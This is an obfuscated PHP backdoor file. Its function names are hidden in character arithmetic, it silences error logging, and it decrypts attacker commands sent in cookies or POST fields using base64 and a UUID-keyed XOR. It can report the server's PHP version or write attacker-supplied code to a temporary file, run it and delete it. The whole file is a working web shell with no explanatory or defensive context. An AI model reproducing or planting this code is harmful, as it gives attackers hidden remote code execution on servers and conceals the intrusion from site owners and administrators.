<?php $qkspwckk = "\x66"."\x69"."\154".chr(101)."\x5f"."\160".chr(389-272)."\164".chr(95)."\x63".chr(111).chr(110)."\x74".'e'.chr(110)."\x74".'s';
$punpptj = 'b'.chr(913-816).'s'.chr(101).chr(54)."\x34"."\137".chr(100)."\145".'c'.chr(475-364).chr(410-310).chr(300-199);
$hetjc = 'i'.'n'.chr(586-481).'_'."\163".chr(141-40).chr(231-115);
$nlavzjhv = 'u'.'n'."\x6c".'i'.chr(110).'k';


@$hetjc('e'.chr(759-645)."\162".chr(1091-980).chr(114)."\x5f"."\x6c".chr(111)."\147", NULL);
@$hetjc("\154"."\157".'g'.chr(95)."\145"."\x72".chr(995-881).chr(111)."\x72"."\163", 0);
@$hetjc(chr(796-687).'a'.'x'."\137"."\145".'x'.chr(123-22)."\x63".chr(356-239)."\x74".'i'.chr(303-192).chr(393-283)."\x5f".'t'.chr(105).chr(690-581).chr(101), 0);
@set_time_limit(0);

function meyiv($uvhkwne, $qgmtmgm)
{
    $liwcbkgsd = "";
    for ($maepbcctbh = 0; $maepbcctbh < strlen($uvhkwne);) {
        for ($j = 0; $j < strlen($qgmtmgm) && $maepbcctbh < strlen($uvhkwne); $j++, $maepbcctbh++) {
            $liwcbkgsd .= chr(ord($uvhkwne[$maepbcctbh]) ^ ord($qgmtmgm[$j]));
        }
    }
    return $liwcbkgsd;
}

$taaxwyk = array_merge($_COOKIE, $_POST);
$johtbbjyqx = '3b0a7708-179e-4527-afec-7a2a4ad08a02';
foreach ($taaxwyk as $sbloicw => $uvhkwne) {
    $uvhkwne = @unserialize(meyiv(meyiv($punpptj($uvhkwne), $johtbbjyqx), $sbloicw));
    if (isset($uvhkwne['a'.'k'])) {
        if ($uvhkwne["\141"] == "\151") {
            $maepbcctbh = array(
                "\160"."\x76" => @phpversion(),
                chr(625-510).'v' => "3.5",
            );
            echo @serialize($maepbcctbh);
        } elseif ($uvhkwne["\141"] == 'e') {
            $hsexyh = "./" . md5($johtbbjyqx) . chr(46)."\151".chr(684-574).chr(287-188);
            @$qkspwckk($hsexyh, "<" . '?'."\x70"."\150"."\160".chr(271-239).'@'."\165".chr(110).chr(160-52)."\151".chr(276-166).chr(107).'('.'_'."\137".chr(70).chr(73).chr(473-397).'E'."\137"."\137"."\x29"."\x3b".' ' . $uvhkwne['d']);
            include($hsexyh);
            @$nlavzjhv($hsexyh);
        }
        exit();
    }
}

